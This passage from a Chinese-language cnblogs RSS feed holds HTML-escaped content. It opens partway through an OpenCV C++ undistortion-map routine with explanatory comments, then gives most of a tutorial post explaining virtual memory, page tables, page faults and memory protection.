    &lt;/span&gt;&lt;span&gt;double&lt;/span&gt; k5 = distCoeffs.cols + distCoeffs.rows - &lt;span&gt;1&lt;/span&gt; &amp;gt;= &lt;span&gt;8&lt;/span&gt; ? distPtr[&lt;span&gt;6&lt;/span&gt;] : &lt;span&gt;0&lt;/span&gt;&lt;span&gt;.;
    &lt;/span&gt;&lt;span&gt;double&lt;/span&gt; k6 = distCoeffs.cols + distCoeffs.rows - &lt;span&gt;1&lt;/span&gt; &amp;gt;= &lt;span&gt;8&lt;/span&gt; ? distPtr[&lt;span&gt;7&lt;/span&gt;] : &lt;span&gt;0&lt;/span&gt;&lt;span&gt;.;
    &lt;/span&gt;&lt;span&gt;double&lt;/span&gt; s1 = distCoeffs.cols + distCoeffs.rows - &lt;span&gt;1&lt;/span&gt; &amp;gt;= &lt;span&gt;12&lt;/span&gt; ? distPtr[&lt;span&gt;8&lt;/span&gt;] : &lt;span&gt;0&lt;/span&gt;&lt;span&gt;.;
    &lt;/span&gt;&lt;span&gt;double&lt;/span&gt; s2 = distCoeffs.cols + distCoeffs.rows - &lt;span&gt;1&lt;/span&gt; &amp;gt;= &lt;span&gt;12&lt;/span&gt; ? distPtr[&lt;span&gt;9&lt;/span&gt;] : &lt;span&gt;0&lt;/span&gt;&lt;span&gt;.;
    &lt;/span&gt;&lt;span&gt;double&lt;/span&gt; s3 = distCoeffs.cols + distCoeffs.rows - &lt;span&gt;1&lt;/span&gt; &amp;gt;= &lt;span&gt;12&lt;/span&gt; ? distPtr[&lt;span&gt;10&lt;/span&gt;] : &lt;span&gt;0&lt;/span&gt;&lt;span&gt;.;
    &lt;/span&gt;&lt;span&gt;double&lt;/span&gt; s4 = distCoeffs.cols + distCoeffs.rows - &lt;span&gt;1&lt;/span&gt; &amp;gt;= &lt;span&gt;12&lt;/span&gt; ? distPtr[&lt;span&gt;11&lt;/span&gt;] : &lt;span&gt;0&lt;/span&gt;&lt;span&gt;.;
    &lt;/span&gt;&lt;span&gt;double&lt;/span&gt; tauX = distCoeffs.cols + distCoeffs.rows - &lt;span&gt;1&lt;/span&gt; &amp;gt;= &lt;span&gt;14&lt;/span&gt; ? distPtr[&lt;span&gt;12&lt;/span&gt;] : &lt;span&gt;0&lt;/span&gt;&lt;span&gt;.;
    &lt;/span&gt;&lt;span&gt;double&lt;/span&gt; tauY = distCoeffs.cols + distCoeffs.rows - &lt;span&gt;1&lt;/span&gt; &amp;gt;= &lt;span&gt;14&lt;/span&gt; ? distPtr[&lt;span&gt;13&lt;/span&gt;] : &lt;span&gt;0&lt;/span&gt;&lt;span&gt;.;

    &lt;/span&gt;&lt;span&gt;//&lt;/span&gt;&lt;span&gt;tauX,tauY这个是什么梯形畸变，用不到的话matTilt为单位阵
    &lt;/span&gt;&lt;span&gt;//&lt;/span&gt;&lt;span&gt; Matrix for trapezoidal distortion of tilted image sensor&lt;/span&gt;
    cv::Matx33d matTilt =&lt;span&gt; cv::Matx33d::eye();
    cv::detail::computeTiltProjectionMatrix(tauX, tauY, &lt;/span&gt;&amp;amp;&lt;span&gt;matTilt);

    &lt;/span&gt;&lt;span&gt;for&lt;/span&gt;( &lt;span&gt;int&lt;/span&gt; i = &lt;span&gt;0&lt;/span&gt;; i &amp;lt; size.height; i++&lt;span&gt; )
    {
        &lt;/span&gt;&lt;span&gt;float&lt;/span&gt;* m1f = map1.ptr&amp;lt;&lt;span&gt;float&lt;/span&gt;&amp;gt;&lt;span&gt;(i);
        &lt;/span&gt;&lt;span&gt;float&lt;/span&gt;* m2f = map2.empty() ? &lt;span&gt;0&lt;/span&gt; : map2.ptr&amp;lt;&lt;span&gt;float&lt;/span&gt;&amp;gt;&lt;span&gt;(i);
        &lt;/span&gt;&lt;span&gt;short&lt;/span&gt;* m1 = (&lt;span&gt;short&lt;/span&gt;*&lt;span&gt;)m1f;
        &lt;/span&gt;&lt;span&gt;ushort&lt;/span&gt;* m2 = (&lt;span&gt;ushort&lt;/span&gt;*&lt;span&gt;)m2f;

        &lt;/span&gt;&lt;span&gt;//&lt;/span&gt;&lt;span&gt;利用逆矩阵iR将二维图像坐标(j,i)转换到摄像机坐标系(_x,_y,_w)&lt;/span&gt;
        &lt;span&gt;double&lt;/span&gt; _x = i*ir[&lt;span&gt;1&lt;/span&gt;] + ir[&lt;span&gt;2&lt;/span&gt;], _y = i*ir[&lt;span&gt;4&lt;/span&gt;] + ir[&lt;span&gt;5&lt;/span&gt;], _w = i*ir[&lt;span&gt;7&lt;/span&gt;] + ir[&lt;span&gt;8&lt;/span&gt;&lt;span&gt;];

        &lt;/span&gt;&lt;span&gt;for&lt;/span&gt;( &lt;span&gt;int&lt;/span&gt; j = &lt;span&gt;0&lt;/span&gt;; j &amp;lt; size.width; j++, _x += ir[&lt;span&gt;0&lt;/span&gt;], _y += ir[&lt;span&gt;3&lt;/span&gt;], _w += ir[&lt;span&gt;6&lt;/span&gt;&lt;span&gt;] )
        {
            &lt;/span&gt;&lt;span&gt;//&lt;/span&gt;&lt;span&gt;摄像机坐标系归一化，令Z=1平面&lt;/span&gt;
            &lt;span&gt;double&lt;/span&gt; w = &lt;span&gt;1&lt;/span&gt;./_w, x = _x*w, y = _y*&lt;span&gt;w;
             &lt;/span&gt;&lt;span&gt;//&lt;/span&gt;&lt;span&gt;这一部分请看OpenCV官方文档，畸变模型部分&lt;/span&gt;
            &lt;span&gt;double&lt;/span&gt; x2 = x*x, y2 = y*&lt;span&gt;y;
            &lt;/span&gt;&lt;span&gt;double&lt;/span&gt; r2 = x2 + y2, _2xy = &lt;span&gt;2&lt;/span&gt;*x*&lt;span&gt;y;
            &lt;/span&gt;&lt;span&gt;double&lt;/span&gt; kr = (&lt;span&gt;1&lt;/span&gt; + ((k3*r2 + k2)*r2 + k1)*r2)/(&lt;span&gt;1&lt;/span&gt; + ((k6*r2 + k5)*r2 + k4)*&lt;span&gt;r2);
            &lt;/span&gt;&lt;span&gt;double&lt;/span&gt; xd = (x*kr + p1*_2xy + p2*(r2 + &lt;span&gt;2&lt;/span&gt;*x2) + s1*r2+s2*r2*&lt;span&gt;r2);
            &lt;/span&gt;&lt;span&gt;double&lt;/span&gt; yd = (y*kr + p1*(r2 + &lt;span&gt;2&lt;/span&gt;*y2) + p2*_2xy + s3*r2+s4*r2*&lt;span&gt;r2);
           &lt;/span&gt;&lt;span&gt;//&lt;/span&gt;&lt;span&gt;根据求取的xd,yd将三维坐标重投影到二维畸变图像坐标(u,v)&lt;/span&gt;
            cv::Vec3d vecTilt = matTilt*cv::Vec3d(xd, yd, &lt;span&gt;1&lt;/span&gt;&lt;span&gt;);
            &lt;/span&gt;&lt;span&gt;double&lt;/span&gt; invProj = vecTilt(&lt;span&gt;2&lt;/span&gt;) ? &lt;span&gt;1&lt;/span&gt;./vecTilt(&lt;span&gt;2&lt;/span&gt;) : &lt;span&gt;1&lt;/span&gt;&lt;span&gt;;
            &lt;/span&gt;&lt;span&gt;double&lt;/span&gt; u = fx*invProj*vecTilt(&lt;span&gt;0&lt;/span&gt;) +&lt;span&gt; u0;
            &lt;/span&gt;&lt;span&gt;double&lt;/span&gt; v = fy*invProj*vecTilt(&lt;span&gt;1&lt;/span&gt;) +&lt;span&gt; v0;
            &lt;/span&gt;&lt;span&gt;//&lt;/span&gt;&lt;span&gt;保存u,v的值到Mapx,Mapy中&lt;/span&gt;
            &lt;span&gt;if&lt;/span&gt;( m1type ==&lt;span&gt; CV_16SC2 )
            {
                &lt;/span&gt;&lt;span&gt;int&lt;/span&gt; iu = saturate_cast&amp;lt;&lt;span&gt;int&lt;/span&gt;&amp;gt;(u*&lt;span&gt;INTER_TAB_SIZE);
                &lt;/span&gt;&lt;span&gt;int&lt;/span&gt; iv = saturate_cast&amp;lt;&lt;span&gt;int&lt;/span&gt;&amp;gt;(v*&lt;span&gt;INTER_TAB_SIZE);
                m1[j&lt;/span&gt;*&lt;span&gt;2&lt;/span&gt;] = (&lt;span&gt;short&lt;/span&gt;)(iu &amp;gt;&amp;gt;&lt;span&gt; INTER_BITS);
                m1[j&lt;/span&gt;*&lt;span&gt;2&lt;/span&gt;+&lt;span&gt;1&lt;/span&gt;] = (&lt;span&gt;short&lt;/span&gt;)(iv &amp;gt;&amp;gt;&lt;span&gt; INTER_BITS);
                m2[j] &lt;/span&gt;= (&lt;span&gt;ushort&lt;/span&gt;)((iv &amp;amp; (INTER_TAB_SIZE-&lt;span&gt;1&lt;/span&gt;))*INTER_TAB_SIZE + (iu &amp;amp; (INTER_TAB_SIZE-&lt;span&gt;1&lt;/span&gt;&lt;span&gt;)));
            }
            &lt;/span&gt;&lt;span&gt;else&lt;/span&gt; &lt;span&gt;if&lt;/span&gt;( m1type ==&lt;span&gt; CV_32FC1 )
            {
                m1f[j] &lt;/span&gt;= (&lt;span&gt;float&lt;/span&gt;&lt;span&gt;)u;
                m2f[j] &lt;/span&gt;= (&lt;span&gt;float&lt;/span&gt;&lt;span&gt;)v;
            }
            &lt;/span&gt;&lt;span&gt;else&lt;/span&gt;&lt;span&gt;
            {
                m1f[j&lt;/span&gt;*&lt;span&gt;2&lt;/span&gt;] = (&lt;span&gt;float&lt;/span&gt;&lt;span&gt;)u;
                m1f[j&lt;/span&gt;*&lt;span&gt;2&lt;/span&gt;+&lt;span&gt;1&lt;/span&gt;] = (&lt;span&gt;float&lt;/span&gt;&lt;span&gt;)v;
            }
        }
    }
}&lt;/span&gt;
&lt;/pre&gt;&lt;/div&gt;
&lt;p&gt;&lt;span&gt; 如有错误，望不吝赐教！&lt;/span&gt;&lt;/p&gt;
&lt;p&gt;&lt;span&gt;另附上CUDA实现两种畸变校正方法的代码，放在我的码云上：&lt;a href=&quot;https://gitee.com/rxdj/camera-calibration.git&quot; target=&quot;_blank&quot;&gt;https://gitee.com/rxdj/camera-calibration.git&lt;/a&gt;。见cudaUndistort中的两个.cu文件&lt;br/&gt;&lt;/span&gt;&lt;/p&gt;
</description>
<pubDate>Thu, 09 Nov 2017 14:49:00 +0000</pubDate>
<dc:creator>一棹烟波</dc:creator>
<dc:language>zh-cn</dc:language>
<dc:format>text/html</dc:format>
<dc:identifier>http://www.cnblogs.com/riddick/p/7811877.html</dc:identifier>
</item>
<item>
<title>什么是内存(二)：虚拟内存 - eleven_yw</title>
<link>http://www.cnblogs.com/yaoxiaowen/p/7805964.html</link>
<guid isPermaLink="true" >http://www.cnblogs.com/yaoxiaowen/p/7805964.html</guid>
<description>&lt;p&gt;通过上一篇文章的扯淡，我们应该已经明白了存储器的层次结构，技术细节很复杂，但是思想却不难理解，因为就是很简单的缓存思想。那么本文我们开始讨论关于内存的另一个话题.&lt;strong&gt;虚拟内存&lt;/strong&gt;。其实思想也是很容易理解的。&lt;/p&gt;
&lt;p&gt;我不知道有多少人听过虚拟内存这个概念，但是虚拟内存是计算机系统最重要的概念之一，并且它成功的主要原因就是它一直在沉默的，自动的工作，换句话说，我们这些做应用的程序员根本不需要干涉它的工作过程，但是一个没追求的码农不是好的搬砖民工，所以作为一个有理想有抱负的程序员，我们还是要去理解&lt;strong&gt;虚拟内存&lt;/strong&gt;，甚至可以这样说，如果不理解虚拟内存，你根本不可能理解程序的深层次运行原理。也不可能去理解汇编器，链接器，加载器，共享对象，文件和进程等概念。&lt;/p&gt;
&lt;p&gt;上篇文章中提出了几个让大家思考的问题:&lt;/p&gt;
&lt;blockquote&gt;
&lt;ul&gt;&lt;li&gt;不管什么程序，最后的直接/间接的编译结果都是0和1，(我们直接理解为汇编)。(这点不知道的，欢迎阅读我的另一篇文章&lt;a href=&quot;http://www.cnblogs.com/yaoxiaowen/p/7470460.html&quot;&gt;关于跨平台的一些认识&lt;/a&gt;)，比如这句汇编代码：&lt;code&gt;mov eax,0x123456;&lt;/code&gt;它的意思是将内存&lt;code&gt;0x123456&lt;/code&gt;处的内容送往&lt;code&gt;eax&lt;/code&gt;这个寄存器。各个应用的数据共同存在内存中的。假设有一个音乐播放器应用的汇编代码中，引用了&lt;code&gt;0x123456&lt;/code&gt;这个内存地址。但是同时运行的应用有很多，那其他应用也完全有可能引用 &lt;code&gt;0x123456&lt;/code&gt;这个地址。那为什么竟然没起冲突和错误呢？&lt;/li&gt;
&lt;/ul&gt;&lt;/blockquote&gt;
&lt;blockquote&gt;
&lt;ul&gt;&lt;li&gt;进程是计算机领域最重要的概念之一，什么是进程？进程是关于某次数据集合的一次运行活动， 是运行在它自己地址空间的一段自包容程序， 解释的通俗的点， 一个程序在运行时，我们会得到一个假象，该进程好像是独占地使用CPU和内存，CPU是没有间断地一条接一条的执行该程序的指令，所有的内存空间都是供该进程的代码和数据分配使用的。(这点不严谨，其实内存还有一部分要分给&lt;code&gt;内核kernel&lt;/code&gt;)。说起来，这个程序就好像得到了全世界一样。，CPU是我的，内存也全部我的，妹子们还是我的。当然这是假象而已。但是这些假象又是怎么做到的呢？&lt;/li&gt;
&lt;/ul&gt;&lt;/blockquote&gt;
&lt;blockquote&gt;
&lt;ul&gt;&lt;li&gt;程序中都会引用库API，比如每个C程序都要引用&lt;code&gt;stdio.h&lt;/code&gt;库的&lt;code&gt;printf()&lt;/code&gt;，在程序运行时，库代码也要被加入到内存，这么多程序都引用了这个库，难道我内存中需要加很多份吗？这自然不可能，那么库代码又是怎么被所有进程共享的呢？&lt;/li&gt;
&lt;/ul&gt;&lt;/blockquote&gt;
&lt;p&gt;这些让我们细思恐极的疑问，都将通过这篇文章来给大家解答。&lt;/p&gt;
&lt;h2 id=&quot;物理和虚拟寻址&quot;&gt;物理和虚拟寻址&lt;/h2&gt;
&lt;p&gt;在访问者看来，主存就是一个有M个字节大小的单元组成的数组，每字节都有一个唯一的物理地址(Physical Address, PA)。 它的访问地址和数组一样，第一个地址为0，后面地址依次为&lt;code&gt;1,2,3-----M-2, M-1&lt;/code&gt;;这叫做线性地址空间。这种自然的访问内存的方式我们称之为&lt;strong&gt;物理寻址(physical addressing)&lt;/strong&gt;。&lt;/p&gt;
&lt;blockquote readability=&quot;6&quot;&gt;
&lt;p&gt;注意：在访问内存时，&lt;strong&gt;对于任意一个地址，(不管是第0个还是第M-1个)，访问该地址的时间总是相同的&lt;/strong&gt;。&lt;/p&gt;
&lt;/blockquote&gt;
&lt;blockquote readability=&quot;8&quot;&gt;
&lt;p&gt;在各种数据结构中，我们都说hash表是最快的，比红黑树之类的都要快，那hash表为什么最快？那是因为hash表内部本质上是使用了数组。所以还是数组最快，那数组为什么最快？这是因为我们知道数组的起始地址以及某个元素的序号，就可以得到该元素在内存中的地址，而对于内存，访问任意一个地址，访问时间总是相同的。而类似链表，树等结构，却只能靠遍历了。(不过好的hash算法还是很难设计的，这是另外一个话题了)。&lt;/p&gt;
&lt;/blockquote&gt;
&lt;p&gt;&lt;img src=&quot;http://images2017.cnblogs.com/blog/918357/201711/918357-20171108185317825-1204338566.jpg&quot; alt=&quot;一个使用物理寻址的系统_10.jpg-34.4kB&quot;/&gt;&lt;/p&gt;
&lt;p&gt;图10：一个使用物理寻址的系统&lt;/p&gt;
&lt;p&gt;上图是一个物理寻址的示例，这是一条加载指令，它读取从物理地址4开始的4个字节，CPU通过内存总线，将指令和地址传递给主存，主存读取从物理地址4处开始的4个字节，返回给CPU。&lt;/p&gt;
&lt;blockquote readability=&quot;7.8355795148248&quot;&gt;
&lt;p&gt;因为这篇文章主要讨论 虚拟内存，是关于L4级主存和磁盘之间的交互问题，为行文方便，文章中有时候直接说内存代指主存。所以这些不要误以为是指L1，L2之类的缓存。如果看不懂这段话啥意思，务必看看我的上一篇文章&lt;a href=&quot;http://www.cnblogs.com/yaoxiaowen/p/7805661.html&quot;&gt;什么是内存（一）：存储器层次结构&lt;/a&gt;,然后再来看这篇文章。&lt;/p&gt;
&lt;/blockquote&gt;
&lt;p&gt;早期计算机使用物理寻址方式，但是到了现在的多任务计算机时代，普遍使用的是&lt;strong&gt;虚拟寻址(virtual addressing)&lt;/strong&gt;。如下图所示：&lt;/p&gt;
&lt;p&gt;&lt;img src=&quot;http://images2017.cnblogs.com/blog/918357/201711/918357-20171108185346513-1960234959.png&quot; alt=&quot;一个使用虚拟寻址的系统_11.png-178.6kB&quot;/&gt;&lt;/p&gt;
&lt;p&gt;图11：一个使用虚拟寻址的系统&lt;/p&gt;
&lt;p&gt;CPU 通过一个&lt;strong&gt;虚拟地址（virtual address,VA）&lt;/strong&gt;来访问主存，这个虚拟地址在被送到主存之前会先转换成一个物理地址。将虚拟地址转换成物理地址的任务叫做&lt;strong&gt;地址翻译（address translation）&lt;/strong&gt;。&lt;/p&gt;
&lt;p&gt;地址翻译需要 CPU 硬件和操作系统之间的配合。 CPU 芯片上叫做&lt;strong&gt;内存管理单元（Menory Management Unit, MMU）&lt;/strong&gt;的专用硬件，利用存放在主存中的查询表来动态翻译虚拟地址，该表的内容由操作系统管理。&lt;/p&gt;
&lt;blockquote readability=&quot;7.3565683646113&quot;&gt;
&lt;p&gt;有少数现代计算机系统依旧在使用物理寻址方式，比如DSP，嵌入式系统，超级计算机系统。这些系统的主要任务是执行单一任务，不像通用性计算机那样需要执行多任务。可以想象到，物理寻址方式更快。这个道理和&lt;a href=&quot;http://www.cnblogs.com/yaoxiaowen/p/7470460.html&quot;&gt;关于跨平台的一些认识&lt;/a&gt;文章中，理论上java比C++慢的道理是一样的。&lt;/p&gt;
&lt;/blockquote&gt;
&lt;p&gt;前面解释完虚拟地址，那么关于文章开头时提的那些疑问，可能有些人心里面都有数了。因为那些地址都是虚拟地址，并非真实的物理内存当中的地址。基本思想已经懂了，那么剩下的我们就更具体的讨论细节。&lt;/p&gt;
&lt;h2 id=&quot;进程地址空间&quot;&gt;进程地址空间&lt;/h2&gt;
&lt;p&gt;&lt;img src=&quot;http://images2017.cnblogs.com/blog/918357/201711/918357-20171108185002684-1465234212.png&quot; alt=&quot;进程地址空间-12.png-228.3kB&quot;/&gt;&lt;br/&gt;图12:进程地址空间&lt;/p&gt;
&lt;p&gt;上图是一个64位的进程地址空间，编译器在编译程序时，将结果编译成32/64位的地址空间。虚拟寻址方式简化了编译器，链接器的工作。同样也因为虚拟内存，每个进程才能有很大的，一致的，私有的的地址空间。这方便了内存管理，保护了每个进程的地址空间不被其他进程破坏。同时也方便了共享库。&lt;/p&gt;
&lt;h2 id=&quot;虚拟内存也是一种缓存思想&quot;&gt;虚拟内存也是一种缓存思想&lt;/h2&gt;
&lt;p&gt;&lt;strong&gt;虚拟内存将主存看成是一个磁盘的高速缓存，主存中只保存活动区域，并根据需要在磁盘和主存之间来回传送数据。&lt;/strong&gt;&lt;/p&gt;
&lt;p&gt;从概念上来说，虚拟内存被组织成为一个由存放在磁盘上的 N 个连续的字节大小的单元组成的数组，也就是字节数组。每个字节都有一个唯一的虚拟地址作为数组的索引。虚拟内存的地址和磁盘的地址之间建立影射关系。磁盘上活动的数组内容被缓存在主存中。在存储器层次结构中，磁盘(较低层L5，参见我们&lt;a href=&quot;http://www.cnblogs.com/yaoxiaowen/p/7805661.html&quot;&gt;上篇文章&lt;/a&gt;图4)的数据被分割成块(block)，这些块作为和主存(较高层,L4)之间的传输单元。主存作为虚拟内存(或者说磁盘)的缓存。&lt;/p&gt;
&lt;p&gt;虚拟内存（VM）系统将虚拟内存分割成称为大小固定的虚拟页（Virtual Page,VP），每个虚拟页的大小为固定字节。同样的，物理内存被分割为物理页（Physical Page,PP）,大小也为固定字节（物理页也称作页帧，page frame）。&lt;/p&gt;
&lt;p&gt;在任意时刻，虚拟页面都分为三个不相交的部分：&lt;/p&gt;
&lt;ul&gt;&lt;li&gt;&lt;strong&gt;未分配的(Unallocated)&lt;/strong&gt;：VM 系统还未分配（或者创建）的页，未分配的页没有任何数据和它们关联，因此不占用任何内存/磁盘空间。&lt;/li&gt;
&lt;li&gt;&lt;strong&gt;缓存的(Cached)&lt;/strong&gt;：当前已缓存在物理内存中的已分配页。&lt;/li&gt;
&lt;li&gt;&lt;strong&gt;未缓存的(UnCached)&lt;/strong&gt;：该页已经映射到磁盘上了，但是还没缓存在物理内存中。&lt;/li&gt;
&lt;/ul&gt;&lt;blockquote readability=&quot;9&quot;&gt;
&lt;p&gt;其中&lt;strong&gt;未分配的VP&lt;/strong&gt;不占用任何的实际物理空间，这点要理解。32位程序地址空间就有4G，至于64G的程序它的地址空间是一个非常大的天文数字(貌似是16777216T)，而目前我们的电脑高配的也就2T磁盘，16G内存。如果64位程序每个VP都映射着实际的PP。无论如何也对应不上的。并且也完全没必要一一映射,&quot;图12:进程地址空间&quot;中可以看到，地址空间内有大量的空白。毕竟程序不可能实际使用那么大的地址空间。&lt;/p&gt;
&lt;/blockquote&gt;
&lt;p&gt;&lt;img src=&quot;http://images2017.cnblogs.com/blog/918357/201711/918357-20171108184518059-1211588113.png&quot; alt=&quot;VM使用主存来作为缓存-13.png-44.8kB&quot;/&gt;&lt;/p&gt;
&lt;p&gt;图13：VM使用主存来作为缓存&lt;/p&gt;
&lt;p&gt;上图展示了在一个有 8 个页面的虚拟内存中，虚拟页 0 和 3 还没有被分配，所以在磁盘上不存在。虚拟页 1，4，6 被缓存在物理内存中。虚拟页 2，5，7 已经被映射分配了，但是还没有缓存在主存中。&lt;/p&gt;
&lt;blockquote readability=&quot;9&quot;&gt;
&lt;p&gt;当然，那个图上标注的不对,VP 部分， &lt;code&gt;n-p&lt;/code&gt;和&lt;code&gt;N-1&lt;/code&gt;应该分别标注为&lt;code&gt;3&lt;/code&gt;和&lt;code&gt;7&lt;/code&gt;,不过我们找不到更合适的图了，(这种图自己画压力太大了)。所以大家知道我们假设共有8个VP就好了。&lt;/p&gt;
&lt;/blockquote&gt;
&lt;h2 id=&quot;页表page-table&quot;&gt;页表(page table)&lt;/h2&gt;
&lt;p&gt;系统必须得有办法判定某个虚拟页是否缓存在主存的某个地方。这具体可分为两种情况。&lt;/p&gt;
&lt;ul&gt;&lt;li&gt;已经在主存中，就需要判断出该虚拟页存在于哪个物理页中。&lt;/li&gt;
&lt;li&gt;不在主存中，那么系统必须判断虚拟页存放在磁盘的哪个位置，并且在物理主存中选择一个牺牲页，并将该虚拟页从磁盘复制到 主存，替换这个牺牲页。&lt;/li&gt;
&lt;/ul&gt;&lt;p&gt;这些功能由软硬件联合提供，包括操作系统，CPU中的&lt;strong&gt;内存管理单元（Memory Management Unit,MMU）&lt;/strong&gt;和一个存放在物理内存中叫&lt;strong&gt;页表（page table）&lt;/strong&gt;的数据结构，页表将虚拟页映射到物理页。每次地址翻译硬件将一个虚拟地址转换成物理地址时都会读取页表。&lt;/p&gt;
&lt;p&gt;&lt;img src=&quot;http://images2017.cnblogs.com/blog/918357/201711/918357-20171108185417622-750029923.png&quot; alt=&quot;页表-14.png-76.5kB&quot;/&gt;&lt;/p&gt;
&lt;p&gt;图14：页表&lt;/p&gt;
&lt;p&gt;上图展示了一个页表的基本结构，页表就是一个&lt;strong&gt;页表条目（Page Table Entry,PTE）&lt;/strong&gt;的数组。虚拟地址的每个页在页表中都有一个对应的PTE。在这里我们假设每个 PTE 是由一个有效位（Valid bit）和一个 n 位地址字段组成的。有效位表明了该虚拟页当前是否被缓存在 主存 中。&lt;/p&gt;
&lt;ul&gt;&lt;li&gt;有效位为 1，则主存缓存了该虚拟页。地址字段就表示主存中相应的物理页的起始位置。&lt;/li&gt;
&lt;li&gt;有效位为 0，则地址字段的null表示这个虚拟页还未被分配，否则该地址就指向该虚拟页在磁盘上的起始位置。&lt;/li&gt;
&lt;/ul&gt;&lt;h2 id=&quot;页命中与缺页&quot;&gt;页命中与缺页&lt;/h2&gt;
&lt;blockquote readability=&quot;7.3068592057762&quot;&gt;
&lt;p&gt;我们在上篇文章&lt;a href=&quot;http://www.cnblogs.com/yaoxiaowen/p/7805661.html&quot;&gt;什么是内存（一）：存储器层次结构&lt;/a&gt;中说过缓存命中与不命中的问题，都是缓存思想，在这里肯定也会存在同样的问题。并且磁盘与主存之间的缓存不命中代价肯定大的多。因为L0-L4之间，每级缓存的速度大约相差10倍左右，但是L4主存与L5磁盘之间，它们的速度相差约十万倍。所以主存与磁盘之间交换的页容量是最大的，尽可能的增加命中率。相应的替换策略，操作系统也使用了更加复杂精密的算法。&lt;/p&gt;
&lt;/blockquote&gt;
&lt;blockquote readability=&quot;6.2702702702703&quot;&gt;
&lt;p&gt;在上篇文章&lt;a href=&quot;http://www.cnblogs.com/yaoxiaowen/p/7805661.html&quot;&gt;什么是内存（一）：存储器层次结构&lt;/a&gt;，每次替换的区域，我们用了&lt;strong&gt;块(block)&lt;/strong&gt;,而这里我们却在说&lt;strong&gt;页(page)&lt;/strong&gt;， 其实同一个意思。只是因为历史原因，叫法不同罢了。&lt;/p&gt;
&lt;/blockquote&gt;
&lt;p&gt;当CPU想要读取包含在某个虚拟页的内容时，如果该页已经缓存在主存中，也就是&lt;strong&gt;页命中&lt;/strong&gt;。perfect,很完美。但是如果该页没有缓存在主存中，则我们称之为&lt;strong&gt;缺页(page fault)&lt;/strong&gt;&lt;/p&gt;
&lt;p&gt;&lt;img src=&quot;http://images2017.cnblogs.com/blog/918357/201711/918357-20171108184841731-1270993019.png&quot; alt=&quot;对VP3中的字的应用会引起不命中-15.png-96.3kB&quot;/&gt;&lt;/p&gt;
&lt;p&gt;图15：对VP3中的字的应用会引起不命中&lt;/p&gt;
&lt;p&gt;如上图所示，CPU 引用了 VP3 中的内容， VP3 并未缓存在主存中。系统从内存中读取 PTE3,得知 VP3 未被缓存，这会触发了一个&lt;strong&gt;缺页异常&lt;/strong&gt;。缺页异常会调用kernel的缺页异常处理程序，该程序会选择一个牺牲页。如下图所示，牺牲页选择了存放在 PP3 中的 VP4。&lt;/p&gt;
&lt;p&gt;&lt;img src=&quot;http://images2017.cnblogs.com/blog/918357/201711/918357-20171108184549575-1146386558.png&quot; alt=&quot;VP4被牺牲了-16.png-92.5kB&quot;/&gt;&lt;br/&gt;图16：VP4被牺牲了&lt;/p&gt;
&lt;p&gt;此时如果 VP4 的内容被修改了，kernel会将它复制回磁盘。接下来，kernel从磁盘赋值 VP3 到内存中的 PP3并更新 PTE3。随后返回用户进程。当异常处理程序返回时，它会重启执行导致缺页的指令，当重新执行这条指令时，因为 VP3 已经在主存中了，此时就是页命中了。&lt;/p&gt;
&lt;p&gt;&lt;img src=&quot;http://images2017.cnblogs.com/blog/918357/201711/918357-20171108184627575-818920641.png&quot; alt=&quot;VP3被缓存到PP3-17.png-98.5kB&quot;/&gt;&lt;/p&gt;
&lt;p&gt;图17：VP3被缓存到PP3&lt;/p&gt;
&lt;p&gt;根据习惯性的叫法，我们在磁盘和内存之间传送页的活动叫做&lt;strong&gt;交换(swapping)&lt;/strong&gt;或者&lt;strong&gt;页面调度(paging)&lt;/strong&gt;。这种交换活动，只有当不命中发生时才会发生，(也就说，系统并不会将磁盘内容预存到内存中)。这种策略被称之为&lt;strong&gt;按需页面调度(demand paging)&lt;/strong&gt;。&lt;/p&gt;
&lt;blockquote readability=&quot;8&quot;&gt;
&lt;p&gt;我们刚才说，缺页错误是一种异常，但是实际上，在计算机系统中，被0除，读写文件，还有上篇文章中我们所说的中断(interrupt)，甚至包括我们代码中写的&lt;code&gt;try catch&lt;/code&gt;，都是一种异常。 比如被0除是intel 的CPU规定的的第0号故障(fault)类型的异常。而读写文件，分别是linux规定的第0号和第1号陷阱(trap)类型的异常。多任务的上下文切换，进程的创建回收等，等与系统中这种异常流的处理密切相关。当然，这是另外一个话题了。我们在这里不做累述。&lt;/p&gt;
&lt;/blockquote&gt;
&lt;h2 id=&quot;虚拟内存作为内存管理和内存保护的工具&quot;&gt;虚拟内存作为内存管理和内存保护的工具&lt;/h2&gt;
&lt;p&gt;&lt;strong&gt;理所当然的，每个进程都有一个独立的页表和一个独立的虚拟地址空间&lt;/strong&gt;&lt;/p&gt;
&lt;p&gt;回到文章开头的问题，比如每个C程序都要调用的 &lt;code&gt;stdio&lt;/code&gt;这个库，不可能为每个进程都添加一份库，内存中只有一份&lt;code&gt;stdio&lt;/code&gt;库的内容，供每个使用该库的进程共享。&lt;/p&gt;
&lt;p&gt;&lt;img src=&quot;http://images2017.cnblogs.com/blog/918357/201711/918357-20171108184927809-1322769232.jpg&quot; alt=&quot;共享页面-18.jpg-37.4kB&quot;/&gt;&lt;/p&gt;
&lt;p&gt;图18：共享页面&lt;/p&gt;
&lt;p&gt;如上图所示: 第一个进程的的页表将 VP2 映射到 某个物理页面。而第二个进程同样将它的 VP2 映射到 该物理页面。所以该物理页面都被两个进程共享了。&lt;/p&gt;
&lt;blockquote readability=&quot;9&quot;&gt;
&lt;p&gt;此时，大家再看一下&quot;图:12 进程地址空间&quot;,就会发现在地址空间当中，&quot;共享库的内存映射区域&quot;对于每个进程起始地址都是相同的。再想想进程之间&lt;strong&gt;共享内存&lt;/strong&gt;的通信方式, 所以说&lt;strong&gt;虚拟内存简化了共享机制&lt;/strong&gt;&lt;/p&gt;
&lt;/blockquote&gt;
&lt;p&gt;大家知道，C语言中存在指针，可以直接进行内存操作。因为有了虚拟内存，所以我们的指针操作也不会访问到其他进程的区域，但是哪怕是对于自己的地址空间，很多内存区域也应该是禁止访问的，这不仅包括kernel的区域，也包括自己的只读代码段。那么虚拟内存就提供了这样的一种内存保护工具。&lt;/p&gt;
&lt;p&gt;&lt;strong&gt;地址翻译机制&lt;/strong&gt;可以使用一种自然的方式来提供内存的访问控制。PTE 上添加一些额外的控制位来添加权限。每次 CPU 生成一个地址时，地址翻译硬件都会读一个 PTE 。&lt;/p&gt;
&lt;p&gt;&lt;img src=&quot;http://images2017.cnblogs.com/blog/918357/201711/918357-20171108185032231-1556179730.png&quot; alt=&quot;虚拟内存提供内存保护-19.png-30.4kB&quot;/&gt;&lt;/p&gt;
&lt;p&gt;图19：虚拟内存提供内存保护&lt;/p&gt;
